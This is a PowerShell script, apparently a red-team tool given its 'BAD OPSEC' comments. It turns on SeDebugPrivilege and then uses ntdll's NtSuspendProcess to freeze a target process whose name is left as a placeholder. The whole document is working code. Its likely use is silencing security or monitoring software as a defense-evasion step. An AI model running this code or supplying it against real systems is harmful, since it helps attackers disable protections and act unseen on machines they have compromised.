# Same script but uses NtSuspendProcess from ntdll instead of OpenThread + SuspendThread
Add-Type @"
    using System;
    using System.Runtime.InteropServices;

    public class Advapi32 {
        [DllImport("advapi32.dll", SetLastError = true)]
        public static extern bool AdjustTokenPrivileges(IntPtr TokenHandle, bool DisableAllPrivileges, ref TOKEN_PRIVILEGES NewState, UInt32 BufferLength, IntPtr PreviousState, IntPtr ReturnLength);

        [DllImport("advapi32.dll", SetLastError = true)]
        public static extern bool LookupPrivilegeValue(string lpSystemName, string lpName, out LUID lpLuid);

        [DllImport("advapi32.dll", SetLastError = true)]
        public static extern bool OpenProcessToken(IntPtr ProcessHandle, UInt32 DesiredAccess, out IntPtr TokenHandle);

        public const UInt32 TOKEN_ADJUST_PRIVILEGES = 0x0020;
        public const UInt32 TOKEN_QUERY = 0x0008;
        public const UInt32 SE_PRIVILEGE_ENABLED = 0x00000002;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct LUID {
        public UInt32 LowPart;
        public Int32 HighPart;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct LUID_AND_ATTRIBUTES {
        public LUID Luid;
        public UInt32 Attributes;
    }

    public struct TOKEN_PRIVILEGES {
        public UInt32 PrivilegeCount;
        public LUID_AND_ATTRIBUTES Privileges;
    }

    public class NtDll {
        [DllImport("ntdll.dll")]
        public static extern int NtSuspendProcess(IntPtr processHandle);

        [DllImport("ntdll.dll")]
        public static extern int NtResumeProcess(IntPtr processHandle);
    }
"@
## BAD OPSEC STARTS HERE
function Enable-DebugPrivilege {
    $hToken = [IntPtr]::Zero
    $luid = New-Object LUID
    $tokenPrivileges = New-Object TOKEN_PRIVILEGES

    if (-not [Advapi32]::OpenProcessToken([System.Diagnostics.Process]::GetCurrentProcess().Handle, [Advapi32]::TOKEN_ADJUST_PRIVILEGES -bor [Advapi32]::TOKEN_QUERY, [ref] $hToken)) {
        throw "Failed to open process token. Error: $($LASTEXITCODE)"
    }

    if (-not [Advapi32]::LookupPrivilegeValue([NullString]::Value, "SeDebugPrivilege", [ref] $luid)) {
        throw "Failed to look up privilege value. Error: $($LASTEXITCODE)"
    }

    $tokenPrivileges.PrivilegeCount = 1
    $tokenPrivileges.Privileges.Luid = $luid
    $tokenPrivileges.Privileges.Attributes = [Advapi32]::SE_PRIVILEGE_ENABLED

    if (-not [Advapi32]::AdjustTokenPrivileges($hToken, $false, [ref] $tokenPrivileges, 0, [IntPtr]::Zero, [IntPtr]::Zero)) {
        throw "Failed to adjust token privileges. Error: $($LASTEXITCODE)"
    }
}

Enable-DebugPrivilege
## BAD OPSEC ENDS HERE

$processName = "process_name"
$process = Get-Process -Name $processName -ErrorAction SilentlyContinue

if ($process -ne $null) {
    # Suspend process
    $processHandle = $process.Handle
    $suspendResult = [NtDll]::NtSuspendProcess($processHandle)

    if ($suspendResult -eq 0) {
        Write-Host "Process $($processName) suspended successfully."
    } else {
        Write-Host "Failed to suspend process $($processName). Error: $($suspendResult)"
    }
} else {
    Write-Host "Process $($processName) not found."
}
